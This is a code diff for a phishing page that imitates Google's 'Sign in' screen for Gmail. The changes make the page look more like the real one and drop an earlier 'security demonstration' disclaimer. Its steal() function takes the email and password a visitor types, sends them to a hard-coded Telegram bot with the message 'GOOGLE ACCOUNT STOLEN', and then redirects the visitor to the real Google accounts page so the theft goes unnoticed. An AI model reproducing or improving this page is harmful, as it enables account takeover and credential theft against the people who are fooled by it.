@@ -1,95 +1,293 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Google Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
+            background: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
+            margin: 0;
         }
-        .container {
-            background: white;
-            padding: 40px;
+
+        .card {
+            background: #ffffff;
+            padding: 48px 40px 36px;
             border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            width: 350px;
-            text-align: center;
+            border: 1px solid #dadce0;
+            max-width: 450px;
+            width: 100%;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
+
         .logo {
-            font-size: 42px;
-            font-weight: bold;
-            color: #4285f4;
-            margin-bottom: 10px;
-        }
-        .subtitle {
-            color: #555;
+            display: flex;
+            justify-content: center;
             margin-bottom: 20px;
         }
-        input {
-            width: 100%;
-            padding: 14px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
+
+        .logo svg {
+            width: 75px;
+            height: 24px;
         }
-        button {
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 28px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group input {
             width: 100%;
-            padding: 14px;
-            background: #4285f4;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+            background: #ffffff;
+            color: #202124;
+        }
+
+        .input-group input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+
+        .input-group input::placeholder {
+            color: #80868b;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: right;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            margin-top: 6px;
+            cursor: pointer;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-btn {
+            background: #1a73e8;
             color: white;
             border: none;
             border-radius: 4px;
-            font-size: 16px;
+            padding: 10px 28px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
-            font-weight: bold;
-            margin-top: 10px;
+            transition: background 0.2s;
+            letter-spacing: 0.3px;
         }
-        button:hover {
-            background: #357ae8;
+
+        .next-btn:hover {
+            background: #1557b0;
         }
+
         .footer {
-            margin-top: 20px;
+            margin-top: 32px;
+            border-top: 1px solid #dadce0;
+            padding-top: 20px;
+            display: flex;
+            justify-content: space-between;
             font-size: 12px;
-            color: #888;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 16px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .lang-select {
+            color: #5f6368;
+            font-size: 12px;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 480px) {
+            .card {
+                padding: 32px 20px 28px;
+                border: none;
+                box-shadow: none;
+            }
+            .button-row {
+                flex-direction: column;
+                gap: 16px;
+            }
+            .next-btn {
+                width: 100%;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">Google</div>
-        <div class="subtitle">Sign in to your Google Account</div>
-        <input type="email" id="email" placeholder="Email or phone">
-        <input type="password" id="password" placeholder="Password">
-        <button onclick="steal()">Next</button>
-        <div class="footer">This is a security demonstration</div>
+
+    <div class="card">
+        <!-- Google Logo -->
+        <div class="logo">
+            <svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M37.5 0C23.8 0 12.7 10.5 12.7 23.5c0 13 11.1 23.5 24.8 23.5 13.7 0 24.8-10.5 24.8-23.5C62.3 10.5 51.2 0 37.5 0zm0 4.5c10.4 0 18.8 8.5 18.8 19 0 10.4-8.4 19-18.8 19S18.7 33.9 18.7 23.5c0-10.4 8.4-19 18.8-19z" fill="#4285F4"/>
+                <path d="M18.7 23.5c0 10.4 8.4 19 18.8 19 10.4 0 18.8-8.6 18.8-19 0-1.1-.1-2.2-.3-3.3H37.5v6.6h10.6c-.5 3-2.5 5.5-5.3 7.1v5.9h8.5c5-4.6 8.2-11.4 8.2-19.3 0-13-11.1-23.5-24.8-23.5S12.7 10.5 12.7 23.5z" fill="#34A853"/>
+                <path d="M21.4 29.5c-1.2-1.9-1.9-4.2-1.9-6.6s.7-4.7 1.9-6.6V10.4h-8.5c-2.6 4.6-4.1 10-4.1 15.9s1.5 11.3 4.1 15.9l8.5-6.7z" fill="#FBBC04"/>
+                <path d="M37.5 42.5c5 0 9.5-1.8 12.9-4.8l-8.5-6.7c-2.4 1.6-5.4 2.5-8.6 2.5-6.6 0-12.2-4.4-14.2-10.4h-8.8v6.8c3.5 6.9 10.6 11.6 18.6 11.6z" fill="#EA4335"/>
+            </svg>
+        </div>
+
+        <h1>Sign in</h1>
+        <div class="subtitle">to continue to Gmail</div>
+
+        <!-- Email Input -->
+        <div class="input-group">
+            <input type="email" id="email" placeholder="Email or phone" autofocus>
+        </div>
+
+        <!-- Password Input (hidden initially, shown after email) -->
+        <div class="input-group" id="passwordGroup" style="display: none;">
+            <input type="password" id="password" placeholder="Enter your password">
+            <a class="forgot-link">Forgot password?</a>
+        </div>
+
+        <div class="button-row">
+            <a class="create-account">Create account</a>
+            <button class="next-btn" id="nextBtn">Next</button>
+        </div>
+
+        <div class="footer">
+            <span>English (United States)</span>
+            <span>
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </span>
+        </div>
     </div>
 
     <script>
+        const emailInput = document.getElementById('email');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const passwordInput = document.getElementById('password');
+        const nextBtn = document.getElementById('nextBtn');
+
+        // Show password field after email is entered
+        emailInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                passwordGroup.style.display = 'block';
+                passwordInput.focus();
+            } else {
+                passwordGroup.style.display = 'none';
+            }
+        });
+
+        // Handle Enter key press
+        function handleKeyPress(e) {
+            if (e.key === 'Enter') {
+                steal();
+            }
+        }
+
+        emailInput.addEventListener('keypress', handleKeyPress);
+        passwordInput.addEventListener('keypress', handleKeyPress);
+
+        // Steal credentials
         function steal() {
-            let email = document.getElementById('email').value;
-            let password = document.getElementById('password').value;
-            
-            if (!email || !password) {
-                alert('Please enter your email and password.');
+            let email = emailInput.value.trim();
+            let password = passwordInput.value.trim();
+
+            if (!email) {
+                alert('Please enter your email.');
+                emailInput.focus();
                 return;
             }
-            
+
+            if (!password) {
+                alert('Please enter your password.');
+                passwordInput.focus();
+                return;
+            }
+
             let message = `🔐 GOOGLE ACCOUNT STOLEN!\n📧 Email: ${email}\n🔑 Password: ${password}`;
-            
+
+            // Send to Telegram
             fetch('https://api.telegram.org/bot8554490167:AAHdIR373gejl6_tStvbGwFHzXAfOUDlnZc/sendMessage?chat_id=5805421075&text=' + encodeURIComponent(message))
                 .then(() => {
-                    window.location.href = 'https://google.com';
+                    window.location.href = 'https://accounts.google.com/';
                 })
                 .catch(() => {
-                    window.location.href = 'https://google.com';
+                    window.location.href = 'https://accounts.google.com/';
                 });
         }
+
+        // Next button click
+        nextBtn.addEventListener('click', steal);
+
+        // Forgot password link
+        document.querySelector('.forgot-link')?.addEventListener('click', function() {
+            alert('This is a demonstration. Please use the Next button to login.');
+        });
+
+        // Create account link
+        document.querySelector('.create-account')?.addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('This is a demonstration. Please use the Next button to login.');
+        });
     </script>
 </body>
 </html>
